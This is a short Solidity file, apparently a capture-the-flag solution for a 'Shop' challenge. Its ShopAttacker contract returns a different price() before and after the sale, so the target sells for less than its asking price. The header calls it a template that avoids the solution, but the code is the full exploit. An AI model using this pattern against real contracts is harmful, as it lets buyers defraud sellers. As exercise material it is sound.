pragma solidity ^0.7.3;
/**
* Attack contract boilerplate template. 
* Useful to create an attack contract for a new challenge without accidentally
* peaking at the solution.
*/
abstract contract IShop {
    uint public price;
    bool public isSold;
    function buy() external virtual;
}

contract ShopAttacker {
    //IShopChallenge public challenge;
    IShop public challenge;

    constructor(address challengeAddress) {
        challenge = IShop(challengeAddress);
    }

    function attack() public {
        challenge.buy();
    }

    function price() external view returns (uint) {
        if (challenge.isSold() == true) {
            return 0;
        } else {
            return 101;
        }
    }
}

